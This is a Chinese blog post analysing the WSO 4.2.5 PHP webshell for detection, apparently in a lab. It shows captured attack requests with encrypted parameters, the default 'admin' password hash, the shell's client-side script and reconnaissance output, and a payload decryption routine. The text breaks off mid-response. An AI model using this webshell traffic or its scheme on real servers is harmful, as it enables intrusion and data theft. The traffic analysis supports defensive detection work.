---
layout: post
title: wso_shell分析文档
author: yaof
---

# <center>协议分析文档</center> #
## 1.&emsp;简介 ##
### 1.1&emsp;目的 ###
&emsp;&emsp;&emsp;描述和分析wso_shell的原理，具体流程，数据包结构及检测方法
### 1.2&emsp;范围 ###
&emsp;&emsp;&emsp;略。
### 1.3&emsp;定义、首字母缩写词和缩略语 ###

### 1.4&emsp;参考资料 ###
&emsp;&emsp;&emsp;略。
### 1.5&emsp;概述 ###
&emsp;&emsp;&emsp;wso_shell是B/S架构的php语言的webshell，通过上传wso_shell到目标服务器中实现对目标服务器的信息获取，文件执行，数据库管理等功能。文档对该webshell的操作以及数据包格式和攻击载荷特征等方面对wso shell进行分析。
### 1.6&emsp;解码方法 ###
&emsp;&emsp;&emsp;对base64编码进行解码,在python27命令行下：<br>&emsp;&emsp;&emsp;<code>import base64</code><br>&emsp;&emsp;&emsp;<code>base64.b64decode(‘’)</code>
## 2.&emsp;协议简介 ##
### 2.1&emsp;协议分析范围 ###
* 服务器安全信息
* 文件操作
* 命令行操作
*  Infect
* 数据库操作
* php代码执行
* 字符串编码解码
* 暴力破解
* 反弹shell

### 2.2&emsp;定义（术语、名词解释） ###
&emsp;&emsp;&emsp;略
## 3.&emsp;协议交互流程 ##
&emsp;&emsp;&emsp;将后门wso-4.2.5.php文件上传到要进行攻击的电脑主机中，通过浏览器对后门文件进行远程访问，对目标靶机的系统中有用信息进行提取和修改在浏览器中每执行一条命令就通过HTTP协议发出一条或多条GET/POST请求；木马针对每条GET/POST请求作出响应，产生一条响应包。具体页面如图3.1所示：<br>![wso_shell]({{ site.baseurl }}/images/wso_shell/wso.png)<br><center>图3.1</center>
## 4.&emsp;数据包格式 ##
### 4.1&emsp;服务器安全信息 ###
#### 4.1.1&emsp;数据包内容 ####
**请求数据包**
<br>

	POST /webshell-master/php/wso/wso-4.2.5.php HTTP/1.1
	Host: 192.168.182.142
	Connection: keep-alive
	Content-Length: 125
	Cache-Control: max-age=0
	Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
	Origin: http://192.168.182.142
	Upgrade-Insecure-Requests: 1
	User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36
	Content-Type: application/x-www-form-urlencoded
	Referer: http://192.168.182.142/webshell-master/php/wso/wso-4.2.5.php
	Accept-Encoding: gzip, deflate
	Accept-Language: zh-CN,zh;q=0.8
	Cookie: 3eff1b2562665d2f7c652d555a2dd7dekey=d69aa478a72ecd3a99c77af6fcf6b917; 3eff1b2562665d2f7c652d555a2dd7de=21232f297a57a5a743894a0e4a801fc3; 3eff1b2562665d2f7c652d555a2dd7destderr_to_out=0; 3eff1b2562665d2f7c652d555a2dd7deajax=1

	a=D3YPXwoAcF0sDVVV&c=FncDXTo%2BfAMqSQseLzIYGDtxaEkDAyFPOD01QDsUaEYDNQBdFDUAQy4TC0oWdz1POy59DQ%3D%3D&p1=&p2=&p3=&charset=UTF-8
**响应数据包**
<br>

	HTTP/1.1 200 OK
	Date: Fri, 04 Nov 2016 05:45:53 GMT
	Server: Apache/2.4.7 (Ubuntu)
	X-Powered-By: PHP/5.5.9-1ubuntu4.19
	Vary: Accept-Encoding
	Content-Encoding: gzip
	Content-Length: 3622
	Keep-Alive: timeout=5, max=100
	Connection: Keep-Alive
	Content-Type: text/html

	<html><head><meta http-equiv='Content-Type' content='text/html; charset=UTF-8'><title>192.168.182.142 - WSO 4.2.5</title>
	<style>
		body {background-color:#060A10; color:#e1e1e1; margin:0; font:normal 75% Arial, Helvetica, sans-serif; } canvas{ display: block; vertical-align: bottom;}
		#particles-js{width: 100%; height: 100px; background-color: #060a10; background-image: url(''); background-repeat: no-repeat; background-size: cover; background-position: 50% 50%;}
		body,td,th	{font:10pt tahoma,arial,verdana,sans-serif,Lucida Sans;margin:0;vertical-align:top;}
		table.info	{color:#C3C3C3;}
		table#toolsTbl {background-color: #060A10;}
		span,h1,a	{color:#fff !important;}
		span		{font-weight:bolder;}
		h1			{border-left:5px solid #2E6E9C;padding:2px 5px;font:14pt Verdana;background-color:#10151c;margin:0px;}
		div.content	{padding:5px;margin-left:5px;background-color:#060a10;}
		a			{text-decoration:none;}
		a:hover		{text-decoration:underline;}
		.tooltip::after {background:#0663D5;color:#FFF;content: attr(data-tooltip);margin-top:-50px;display:block;padding:6px 10px;position:absolute;visibility:hidden;}
		.tooltip:hover::after {opacity:1;visibility:visible;}
		.ml1		{border:1px solid #202832;padding:5px;margin:0;overflow:auto;}
		.bigarea	{min-width:100%;max-width:100%;height:400px;}
		input, textarea, select	{margin:0;color:#fff;background-color:#202832;border:none;font:9pt Courier New;outline:none;}
		label {position:relative}
		label:after {content:'<>';font:10px 'Consolas', monospace;color:#fff;-webkit-transform:rotate(90deg);-moz-transform:rotate(90deg);-ms-transform:rotate(90deg);transform:rotate(90deg);right:3px; top:3px;padding:0;position:absolute;pointer-events:none;}
		label:before {content:'';right:0; top:0;width:17px; height:17px;background:#202832;position:absolute;pointer-events:none;display:block;}
		form		{margin:0px;}
		#toolsTbl	{text-align:center;}
		#fak 		{background:none;}
		#fak td 	{padding:5px 0 0 0;}
		iframe		{border:1px solid #060a10;}
		.toolsInp	{width:300px}
		.main th	{text-align:left;background-color:#060a10;}
		.main tr:hover{background-color:#354252;}
		.main td, th{vertical-align:middle;}
		input[type='submit']{background-color:#2E6E9C;}
		input[type='button']{background-color:#2E6E9C;}
		input[type='submit']:hover{background-color:#56AD15;}
		input[type='button']:hover{background-color:#56AD15;}
		.l1			{background-color:#202832;}
		pre			{font:9pt Courier New;}
	</style>
	<script>
	    var c_ = '/var/www/html/webshell-master/php/wso/';
	    var a_ = 'SecInfo'
	    var charset_ = 'UTF-8';
	    var p1_ = '';
	    var p2_ = '';
	    var p3_ = '';
	    var d = document;
		
		function encrypt(str,pwd){if(pwd==null||pwd.length<=0){return null;}str=base64_encode(str);pwd=base64_encode(pwd);var enc_chr='';var enc_str='';var i=0;while(i<str.length){for(var j=0;j<pwd.length;j++){enc_chr=str.charCodeAt(i)^pwd.charCodeAt(j);enc_str+=String.fromCharCode(enc_chr);i++;if(i>=str.length)break;}}return base64_encode(enc_str);}
		function utf8_encode(argString){var string=(argString+'');var utftext='',start,end,stringl=0;start=end=0;stringl=string.length;for(var n=0;n<stringl;n++){var c1=string.charCodeAt(n);var enc=null;if(c1<128){end++;}else if(c1>127&&c1<2048){enc=String.fromCharCode((c1>>6)|192)+String.fromCharCode((c1&63)|128);}else{enc=String.fromCharCode((c1>>12)|224)+String.fromCharCode(((c1>>6)&63)|128)+String.fromCharCode((c1&63)|128);}if(enc!==null){if(end>start){utftext+=string.slice(start,end);}utftext+=enc;start=end=n+1;}}if(end>start){utftext+=string.slice(start,stringl);}return utftext;}
		function base64_encode(data){var b64 = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';var o1,o2,o3,h1,h2,h3,h4,bits,i=0,ac=0,enc='',tmp_arr=[];if (!data){return data;}data=utf8_encode(data+'');do{o1=data.charCodeAt(i++);o2=data.charCodeAt(i++);o3=data.charCodeAt(i++);bits=o1<<16|o2<<8|o3;h1=bits>>18&0x3f;h2=bits>>12&0x3f;h3=bits>>6&0x3f;h4=bits&0x3f;tmp_arr[ac++]=b64.charAt(h1)+b64.charAt(h2)+b64.charAt(h3)+b64.charAt(h4);}while(i<data.length);enc=tmp_arr.join('');switch (data.length%3){case 1:enc=enc.slice(0,-2)+'==';break;case 2:enc=enc.slice(0,-1)+'=';break;}return enc;}
		function set(a,c,p1,p2,p3,charset) {
			if(a!=null)d.mf.a.value=a;else d.mf.a.value=a_;
			if(c!=null)d.mf.c.value=c;else d.mf.c.value=c_;
			if(p1!=null)d.mf.p1.value=p1;else d.mf.p1.value=p1_;
			if(p2!=null)d.mf.p2.value=p2;else d.mf.p2.value=p2_;
			if(p3!=null)d.mf.p3.value=p3;else d.mf.p3.value=p3_;
			d.mf.a.value = encrypt(d.mf.a.value,'d69aa478a72ecd3a99c77af6fcf6b917');
			d.mf.c.value = encrypt(d.mf.c.value,'d69aa478a72ecd3a99c77af6fcf6b917');
			d.mf.p1.value = encrypt(d.mf.p1.value,'d69aa478a72ecd3a99c77af6fcf6b917');
			d.mf.p2.value = encrypt(d.mf.p2.value,'d69aa478a72ecd3a99c77af6fcf6b917');
			d.mf.p3.value = encrypt(d.mf.p3.value,'d69aa478a72ecd3a99c77af6fcf6b917');
			if(charset!=null)d.mf.charset.value=charset;else d.mf.charset.value=charset_;
		}
		function g(a,c,p1,p2,p3,charset) {
			set(a,c,p1,p2,p3,charset);
			d.mf.submit();
		}
		function a(a,c,p1,p2,p3,charset) {
			set(a,c,p1,p2,p3,charset);
			var params = 'ajax=true';
			for(i=0;i<d.mf.elements.length;i++)
				params += '&'+d.mf.elements[i].name+'='+encodeURIComponent(d.mf.elements[i].value);
			sr('/webshell-master/php/wso/wso-4.2.5.php', params);
		}
		function sr(url, params) {
			if (window.XMLHttpRequest)
				req = new XMLHttpRequest();
			else if (window.ActiveXObject)
				req = new ActiveXObject('Microsoft.XMLHTTP');
	        if (req) {
	            req.onreadystatechange = processReqChange;
	            req.open('POST', url, true);
	            req.setRequestHeader ('Content-Type', 'application/x-www-form-urlencoded');
	            req.send(params);
	        }
		}
		function processReqChange() {
			if( (req.readyState == 4) )
				if(req.status == 200) {
					var reg = new RegExp("(\\d+)([\\S\\s]*)", 'm');
					var arr=reg.exec(req.responseText);
					eval(arr[2].substr(0, arr[1]));
				} else alert('Request error!');
		}
	</script>
	<head><body><div style='position:absolute;background-color:rgba(95, 110, 130, 0.3);width:100%;top:0;left:0;'>
	<form method=post name=mf style='display:none;'>
	<input type=hidden name=a>
	<input type=hidden name=c>
	<input type=hidden name=p1>
	<input type=hidden name=p2>
	<input type=hidden name=p3>
	<input type=hidden name=charset>
	</form><table class=info cellpadding=3 cellspacing=0 width=100%><tr><td width=1><span>Uname:<br>User:<br>Php:<br>Hdd:<br>Cwd:</span></td><td><nobr>Linux ubuntu 3.19.0-25-generic #26~14.04.1-Ubuntu SMP Fri Jul 24 21:16:20 UTC 2015 x86_64 <a href="http://noreferer.de/?http://www.google.com/search?q=Linux+ubuntu+3.19.0-25-generic+%2326%7E14.04.1-Ubuntu+SMP+Fri+Jul+24+21%3A16%3A20+UTC+2015+x86_64" target="_blank">[ Google ]</a> <a href="http://noreferer.de/?http://www.exploit-db.com/search/?action=search&description=Linux+Kernel+3.19.0" target=_blank>[ Exploit-DB ]</a></nobr><br>33 ( www-data ) <span>Group:</span> 33 ( www-data )<br>5.5.9-1ubuntu4.19 <span>Safe mode:</span> <font color=#FFDB5F><b>OFF</b></font> <a href=# onclick="g('Php',null,null,'info')">[ phpinfo ]</a> <span>Datetime:</span> 2016-10-26 20:44:29<br>18.58 GB <span>Free:</span> 13.12 GB (70.63%)<br><a href='#' onclick='g("FilesMan","/")'>/</a><a href='#' onclick='g("FilesMan","/var/")'>var/</a><a href='#' onclick='g("FilesMan","/var/www/")'>www/</a><a href='#' onclick='g("FilesMan","/var/www/html/")'>html/</a><a href='#' onclick='g("FilesMan","/var/www/html/webshell-master/")'>webshell-master/</a><a href='#' onclick='g("FilesMan","/var/www/html/webshell-master/php/")'>php/</a><a href='#' onclick='g("FilesMan","/var/www/html/webshell-master/php/wso/")'>wso/</a> <font color=#FFDB5F><b>drwxrwxrwx</b></font> <a href=# onclick="g('FilesMan','/var/www/html/webshell-master/php/wso','','','')">[ home ]</a><br></td><td width=1 align=right><nobr><label><select onchange="g(null,null,null,null,null,this.value)"><option value="UTF-8" selected>UTF-8</option><option value="Windows-1251" >Windows-1251</option><option value="KOI8-R" >KOI8-R</option><option value="KOI8-U" >KOI8-U</option><option value="cp866" >cp866</option></select></label><br><span>Server IP:</span><br>192.168.182.142<br><span>Client IP:</span><br>192.168.182.1</nobr></td></tr></table><table style="background-color:#2E6E9C;" cellpadding=3 cellspacing=0 width=100%><tr><th>[ <a href="#" onclick="g('SecInfo',null,'','','')">Sec. Info</a> ]</th><th>[ <a href="#" onclick="g('FilesMan',null,'','','')">Files</a> ]</th><th>[ <a href="#" onclick="g('Console',null,'','','')">Console</a> ]</th><th>[ <a href="#" onclick="g('Infect',null,'','','')">Infect</a> ]</th><th>[ <a href="#" onclick="g('Sql',null,'','','')">Sql</a> ]</th><th>[ <a href="#" onclick="g('Php',null,'','','')">Php</a> ]</th><th>[ <a href="#" onclick="g('SafeMode',null,'','','')">Safe mode</a> ]</th><th>[ <a href="#" onclick="g('StringTools',null,'','','')">String tools</a> ]</th><th>[ <a href="#" onclick="g('Bruteforce',null,'','','')">Bruteforce</a> ]</th><th>[ <a href="#" onclick="g('Network',null,'','','')">Network</a> ]</th><th>[ <a href="#" onclick="g('Logout',null,'','','')">Logout</a> ]</th><th>[ <a href="#" onclick="g('SelfRemove',null,'','','')">Self remove</a> ]</th></tr></table><div><h1>Server security information</h1><div class=content><span>Server software: </span>Apache/2.4.7 (Ubuntu)<br><span>Loaded Apache modules: </span>core, mod_so, mod_watchdog, http_core, mod_log_config, mod_logio, mod_version, mod_unixd, mod_access_compat, mod_alias, mod_auth_basic, mod_authn_core, mod_authn_file, mod_authz_core, mod_authz_host, mod_authz_user, mod_autoindex, mod_deflate, mod_dir, mod_env, mod_filter, mod_mime, prefork, mod_negotiation, mod_php5, mod_setenvif, mod_socache_shmcb, mod_ssl, mod_status<br><span>Disabled PHP Functions: </span>pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,<br><span>cURL support: </span>no<br><span>Supported databases: </span>MySql (5.5.50)<br><br><span>Readable /etc/passwd: </span>yes <a href='#' onclick='g("FilesTools", "/etc/", "passwd")'>[view]</a><br><span>Readable /etc/shadow: </span>no<br><span>OS version: </span>Linux version 3.19.0-25-generic (buildd@lgw01-20) (gcc version 4.8.2 (Ubuntu 4.8.2-19ubuntu1) ) #26~14.04.1-Ubuntu SMP Fri Jul 24 21:16:20 UTC 2015<br><span>Distr name: </span>Ubuntu 14.04.3 LTS<br><br><span>Userful: </span>gcc, lcc, cc, ld, make, php, perl, python, ruby, tar, gzip, bzip, bzip2, nc, locate, suidperl<br><span>Danger: </span>kav, nod32, bdcored, uvscan, sav, drwebd, clamd, rkhunter, chkrootkit, iptables, ipfw, tripwire, shieldcc, portsentry, snort, ossec, lidsadm, tcplodg, sxid, logcheck, logwatch, sysmask, zmbscap, sawmill, wormscan, ninja<br><span>Downloaders: </span>wget, fetch, lynx, links, curl, get, lwp-mirror<br><br/><span>HDD space: </span><pre class=ml1>Filesystem      Size  Used Avail Use% Mounted on
	/dev/sda1        19G  4.5G   14G  26% /
	none            4.0K     0  4.0K   0% /sys/fs/cgroup
	udev            982M  4.0K  982M   1% /dev
	tmpfs           199M  1.5M  198M   1% /run
	none            5.0M     0  5.0M   0% /run/lock
	none            993M  284K  993M   1% /run/shm
	none            100M   64K  100M   1% /run/user</pre><span>Hosts: </span><pre class=ml1>127.0.0.1	localhost
	127.0.1.1	ubuntu
	
	# The following lines are desirable for IPv6 capable hosts
	::1     ip6-localhost ip6-loopback
	fe00::0 ip6-localnet
	ff00::0 ip6-mcastprefix
	ff02::1 ip6-allnodes
	ff02::2 ip6-allrouters</pre><span>Mount options: </span><pre class=ml1># /etc/fstab: static file system information.
	#
	# Use 'blkid' to print the universally unique identifier for a
	# device; this may be used with UUID= as a more robust way to name devices
	# that works even if disks are added and removed. See fstab(5).
	#
	# <file system> <mount point>   <type>  <options>       <dump>  <pass>
	# / was on /dev/sda1 during installation
	UUID=e2e224b9-943a-4aca-a16b-5c1ad56c2bb8 /               ext4    errors=remount-ro 0       1
	# swap was on /dev/sda5 during installation
	UUID=69e07eed-0262-4c8a-8d02-91f64ab7eb90 none            swap    sw              0       0
	/dev/fd0        /media/floppy0  auto    rw,user,noauto,exec,utf8 0       0</pre></div>
	</div>
	<table class=info id=toolsTbl cellpadding=3 cellspacing=0 width=100%>
		<tr>
			<td><form onsubmit="g(null,this.c.value,'');return false;"><span>Change dir:</span><br><input class='toolsInp' type=text name=c value='/var/www/html/webshell-master/php/wso/'><input type=submit value='submit'></form></td>
			<td><form onsubmit="g('FilesTools',null,this.f.value);return false;"><span>Read file:</span><br><input class='toolsInp' type=text name=f required><input type=submit value='submit'></form></td>
		</tr><tr>
			<td><form onsubmit="g('FilesMan',null,'mkdir',this.d.value);return false;"><span>Make dir:</span> <font color='#FFDB5F'>[ Writeable ]</font><br><input class='toolsInp' type=text name=d required><input type=submit value='submit'></form></td>
			<td><form onsubmit="g('FilesTools',null,this.f.value,'mkfile');return false;"><span>Make file:</span> <font color='#FFDB5F'>[ Writeable ]</font><br><input class='toolsInp' type=text name=f required><input type=submit value='submit'></form></td>
		</tr><tr>
			<td><form onsubmit="g('Console',null,this.c.value);return false;"><span>Execute:</span><br><input class='toolsInp' type=text name=c value=''><input type=submit value='submit'></form></td>
			<td><form method='post' ENCTYPE='multipart/form-data'>
			<input type=hidden name=a value='FilesMan'>
			<input type=hidden name=c value='/var/www/html/webshell-master/php/wso/'>
			<input type=hidden name=p1 value='uploadFile'>
			<input type=hidden name=ne value=''>
			<input type=hidden name=charset value='UTF-8'>
			<span>Upload file:</span> <font color='#FFDB5F'>[ Writeable ]</font><br><input class='toolsInp' type=file name=f[]  multiple><input type=submit value='submit'></form><br  ></td>
		</tr></table></div>
		<!-- particles --> <div id='particles-js'></div><script src='http://cdn.jsdelivr.net/particles.js/2.0.0/particles.min.js'></script>
		<script>particlesJS('particles-js', {'particles':{'number':{'value':80,'density':{'enable':true,'value_area':800}},'color':{'value':'#ffffff'},'shape':{'type':'triangle','stroke':{'width':0,'color':'#000000'},'polygon':{'nb_sides':5},'image':{'src':'img/github.svg','width':100,'height':100}},'opacity':{'value':0.5,'random':true,'anim':{'enable':false,'speed':1,'opacity_min':0.1,'sync':false}},'size':{'value':3,'random':true,'anim':{'enable':false,'speed':40,'size_min':0.1,'sync':false}},'line_linked':{'enable':true,'distance':200,'color':'#ffffff','opacity':0.4,'width':1},'move':{'enable':true,'speed':1,'direction':'none','random':true,'straight':false,'out_mode':'out','bounce':false,'attract':{'enable':false,'rotateX':10000,'rotateY':10000}}},'interactivity':{'detect_on':'canvas','events':{'onhover':{'enable':true,'mode':'grab'},'onclick':{'enable':true,'mode':'repulse'},'resize':true},'modes':{'grab':{'distance':200,'line_linked':{'opacity':0.5}},'bubble':{'particles_nb':2}}},'retina_detect':true});</script>
		</body></html>

#### 4.1.2&emsp;数据包分析 ####
>数据包攻击载荷：<font color=red>a=D3YPXwoAcF0sDVVV&c=FncDXTo%2BfAMqSQseLzIYGDtxaEkDAyFPOD01QDsUaEYDNQBdFDUAQy4TC0oWdz1POy59DQ%3D%3D&p1=&p2=&p3=&charset=UTF-8</font>

>请求头数据包分析：数据包为POST请求包，真正的攻击载荷在请求体中，所以请求头中真正重要的数据为<font color=red>Cookie: 3eff1b2562665d2f7c652d555a2dd7dekey=d69aa478a72ecd3a99c77af6fcf6b917; 3eff1b2562665d2f7c652d555a2dd7de=21232f297a57a5a743894a0e4a801fc3; 3eff1b2562665d2f7c652d555a2dd7destderr_to_out=0; 3eff1b2562665d2f7c652d555a2dd7deajax=1</font>通过对wso4.2.5版本的webshell进行源码分析：

	function prototype($k, $v) {
    $_COOKIE[$k] = $v;
    setcookie($k, $v);
	}
>setcookie()函数将需要的数据放入http请求的cookie字段中。同时3eff1b2562665d2f7c652d555a2dd7de该数值为http请求的host通过MD5加密生成，key=d69aa478a72ecd3a99c77af6fcf6b917该数值是key=md5($_SERVER['HTTP_USER_AGENT'])即http请求中user_agent通过MD5加密后生成。21232f297a57a5a743894a0e4a801fc3为源码中该webshell进行登录的密码"admin"进行MD5加密。

>具体攻击载荷分析：a=D3YPXwoAcF0sDVVV其中"a"为"action"含义，即操作的动作，该值生成方式为具体动作与key="d69aa478a72ecd3a99c77af6fcf6b917"的base64编码值先进行异或操作，然后进行base64编码，最后进行url编码后生成。所以该操作的解密方式为：先进行url解码操作，然后进行base64解码，最后再进行异或操作。具体解码函数为：

	function decrypt($str,$pwd)
	{
	    $pwd=base64_encode($pwd);
	    $str=base64_decode($str);
	    $enc_chr="";
	    $enc_str="";
	    $i=0;
	    while($i<strlen($str))
	    {
	        for($j=0;$j<strlen($pwd);$j++)
	        {
	            $enc_chr=chr(ord($str[$i])^ord($pwd[$j]));
	            $enc_str.=$enc_chr;$i++;
	            if($i>=strlen($str))
	                break;
	        }
	    }
	    return base64_decode($enc_str);
	}
>根据解码函数可以解密a="SecInfo",同理解密c="/var/www/html/webshell-master/php/wso/"即该文件所在文件夹路径。"&p1=&p2=&p3="该值为具体执行的命令payload，由于这个操作为一级操作，所以该值为空，"charset"为数据包格式utf-8。

>响应数据包分析：wso_shell的响应返回方式主要有两种，一种是全部刷新，即响应返回整个html页面，另一种方式为输入输出框通过Ajax异步请求的方式进行局部刷新局部跳转，响应只返回输入输出框中的特定内容。查看服务器安全信息操作为一级操作，响应返回整个html页面。

>具体信息如图4.1.1所示：<br>![wso_shell]({{ site.baseurl }}/images/wso_shell/Secinfo.png)<br><center>图4.1.1</center>

### 4.2&emsp;文件操作 ###
&emsp;&emsp;&emsp;文件操作主要分为:

* 文件夹一级操作
* 文件基本操作（文件的增删改查）
* 文件上传操作
 
#### 4.2.1&emsp;文件夹一级操作 ####
&emsp;&emsp;&emsp;点击一级菜单"Files"命令查看webshell所在路径下的所有文件信息。
##### 4.2.1.1&emsp;数据包内容 #####

**请求数据包**
<br>

	POST /webshell-master/php/wso/wso-4.2.5.php HTTP/1.1
	Host: 192.168.182.143
	Connection: keep-alive
	Content-Length: 125
	Cache-Control: max-age=0
	Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
	Origin: http://192.168.182.143
	Upgrade-Insecure-Requests: 1
	User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36
	Content-Type: application/x-www-form-urlencoded
	Referer: http://192.168.182.143/webshell-master/php/wso/wso-4.2.5.php
	Accept-Encoding: gzip, deflate
	Accept-Language: zh-CN,zh;q=0.8
	Cookie: da94407ecf64bda7c0ac6ea1fa4477d8stderr_to_out=1; da94407ecf64bda7c0ac6ea1fa4477d8ajax=0; da94407ecf64bda7c0ac6ea1fa4477d8key=d69aa478a72ecd3a99c77af6fcf6b917; da94407ecf64bda7c0ac6ea1fa4477d8=21232f297a57a5a743894a0e4a801fc3; PHPSESSID=mh6l96lmrd0so2isi315c3loi4
	
	a=CCk1RgMPC34XLVxV&c=FncDXTo%2BfAMqSQseLzIYGDtxaEkDAyFPOD01QDsUaEYDNQBdFDUAQy4TC0oWdz1POy59DQ%3D%3D&p1=&p2=&p3=&charset=UTF-8

**响应数据包**
<br>

	HTTP/1.1 200 OK
	Date: Fri, 04 Nov 2016 05:45:53 GMT
	Server: Apache/2.4.7 (Ubuntu)
	X-Powered-By: PHP/5.5.9-1ubuntu4.19
	Vary: Accept-Encoding
	Content-Encoding: gzip
	Content-Length: 3622
	Keep-Alive: timeout=5, max=100
	Connection: Keep-Alive
	Content-Type: text/html

	<html><head><meta http-equiv='Content-Type' content='text/html; charset=UTF-8'><title>192.168.182.143 - WSO 4.2.5</title>
	<style>
		body {background-color:#060A10; color:#e1e1e1; margin:0; font:normal 75% Arial, Helvetica, sans-serif; } canvas{ display: block; vertical-align: bottom;}
		#particles-js{width: 100%; height: 100px; background-color: #060a10; background-image: url(''); background-repeat: no-repeat; background-size: cover; background-position: 50% 50%;}
		body,td,th	{font:10pt tahoma,arial,verdana,sans-serif,Lucida Sans;margin:0;vertical-align:top;}
		table.info	{color:#C3C3C3;}
		table#toolsTbl {background-color: #060A10;}
		span,h1,a	{color:#fff !important;}
		span		{font-weight:bolder;}
		h1			{border-left:5px solid #2E6E9C;padding:2px 5px;font:14pt Verdana;background-color:#10151c;margin:0px;}
		div.content	{padding:5px;margin-left:5px;background-color:#060a10;}
		a			{text-decoration:none;}
		a:hover		{text-decoration:underline;}
		.tooltip::after {background:#0663D5;color:#FFF;content: attr(data-tooltip);margin-top:-50px;display:block;padding:6px 10px;position:absolute;visibility:hidden;}
		.tooltip:hover::after {opacity:1;visibility:visible;}
		.ml1		{border:1px solid #202832;padding:5px;margin:0;overflow:auto;}
		.bigarea	{min-width:100%;max-width:100%;height:400px;}
		input, textarea, select	{margin:0;color:#fff;background-color:#202832;border:none;font:9pt Courier New;outline:none;}
		label {position:relative}
		label:after {content:'<>';font:10px 'Consolas', monospace;color:#fff;-webkit-transform:rotate(90deg);-moz-transform:rotate(90deg);-ms-transform:rotate(90deg);transform:rotate(90deg);right:3px; top:3px;padding:0;position:absolute;pointer-events:none;}
		label:before {content:'';right:0; top:0;width:17px; height:17px;background:#202832;position:absolute;pointer-events:none;display:block;}
		form		{margin:0px;}
		#toolsTbl	{text-align:center;}
		#fak 		{background:none;}
		#fak td 	{padding:5px 0 0 0;}
		iframe		{border:1px solid #060a10;}
		.toolsInp	{width:300px}
		.main th	{text-align:left;background-color:#060a10;}
		.main tr:hover{background-color:#354252;}
		.main td, th{vertical-align:middle;}
		input[type='submit']{background-color:#2E6E9C;}
		input[type='button']{background-color:#2E6E9C;}
		input[type='submit']:hover{background-color:#56AD15;}
		input[type='button']:hover{background-color:#56AD15;}
		.l1			{background-color:#202832;}
		pre			{font:9pt Courier New;}
	</style>
	<script>
	    var c_ = '/var/www/html/webshell-master/php/wso/';
	    var a_ = 'FilesMan'
	    var charset_ = 'UTF-8';
	    var p1_ = '';
	    var p2_ = '';
	    var p3_ = '';
	    var d = document;
		
		function encrypt(str,pwd){if(pwd==null||pwd.length<=0){return null;}str=base64_encode(str);pwd=base64_encode(pwd);var enc_chr='';var enc_str='';var i=0;while(i<str.length){for(var j=0;j<pwd.length;j++){enc_chr=str.charCodeAt(i)^pwd.charCodeAt(j);enc_str+=String.fromCharCode(enc_chr);i++;if(i>=str.length)break;}}return base64_encode(enc_str);}
		function utf8_encode(argString){var string=(argString+'');var utftext='',start,end,stringl=0;start=end=0;stringl=string.length;for(var n=0;n<stringl;n++){var c1=string.charCodeAt(n);var enc=null;if(c1<128){end++;}else if(c1>127&&c1<2048){enc=String.fromCharCode((c1>>6)|192)+String.fromCharCode((c1&63)|128);}else{enc=String.fromCharCode((c1>>12)|224)+String.fromCharCode(((c1>>6)&63)|128)+String.fromCharCode((c1&63)|128);}if(enc!==null){if(end>start){utftext+=string.slice(start,end);}utftext+=enc;start=end=n+1;}}if(end>start){utftext+=string.slice(start,stringl);}return utftext;}
		function base64_encode(data){var b64 = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';var o1,o2,o3,h1,h2,h3,h4,bits,i=0,ac=0,enc='',tmp_arr=[];if (!data){return data;}data=utf8_encode(data+'');do{o1=data.charCodeAt(i++);o2=data.charCodeAt(i++);o3=data.charCodeAt(i++);bits=o1<<16|o2<<8|o3;h1=bits>>18&0x3f;h2=bits>>12&0x3f;h3=bits>>6&0x3f;h4=bits&0x3f;tmp_arr[ac++]=b64.charAt(h1)+b64.charAt(h2)+b64.charAt(h3)+b64.charAt(h4);}while(i<data.length);enc=tmp_arr.join('');switch (data.length%3){case 1:enc=enc.slice(0,-2)+'==';break;case 2:enc=enc.slice(0,-1)+'=';break;}return enc;}
		function set(a,c,p1,p2,p3,charset) {
			if(a!=null)d.mf.a.value=a;else d.mf.a.value=a_;
			if(c!=null)d.mf.c.value=c;else d.mf.c.value=c_;
			if(p1!=null)d.mf.p1.value=p1;else d.mf.p1.value=p1_;
			if(p2!=null)d.mf.p2.value=p2;else d.mf.p2.value=p2_;
			if(p3!=null)d.mf.p3.value=p3;else d.mf.p3.value=p3_;
			d.mf.a.value = encrypt(d.mf.a.value,'d69aa478a72ecd3a99c77af6fcf6b917');
			d.mf.c.value = encrypt(d.mf.c.value,'d69aa478a72ecd3a99c77af6fcf6b917');
			d.mf.p1.value = encrypt(d.mf.p1.value,'d69aa478a72ecd3a99c77af6fcf6b917');
			d.mf.p2.value = encrypt(d.mf.p2.value,'d69aa478a72ecd3a99c77af6fcf6b917');
			d.mf.p3.value = encrypt(d.mf.p3.value,'d69aa478a72ecd3a99c77af6fcf6b917');
			if(charset!=null)d.mf.charset.value=charset;else d.mf.charset.value=charset_;
		}
		function g(a,c,p1,p2,p3,charset) {
			set(a,c,p1,p2,p3,charset);
			d.mf.submit();
		}
		function a(a,c,p1,p2,p3,charset) {
			set(a,c,p1,p2,p3,charset);
			var params = 'ajax=true';
			for(i=0;i<d.mf.elements.length;i++)
				params += '&'+d.mf.elements[i].name+'='+encodeURIComponent(d.mf.elements[i].value);
			sr('/webshell-master/php/wso/wso-4.2.5.php', params);
		}
		function sr(url, params) {
			if (window.XMLHttpRequest)
				req = new XMLHttpRequest();
			else if (window.ActiveXObject)
				req = new ActiveXObject('Microsoft.XMLHTTP');
	        if (req) {
	            req.onreadystatechange = processReqChange;
	            req.open('POST', url, true);
	            req.setRequestHeader ('Content-Type', 'application/x-www-form-urlencoded');
	            req.send(params);
	        }
		}
		function processReqChange() {
			if( (req.readyState == 4) )
				if(req.status == 200) {
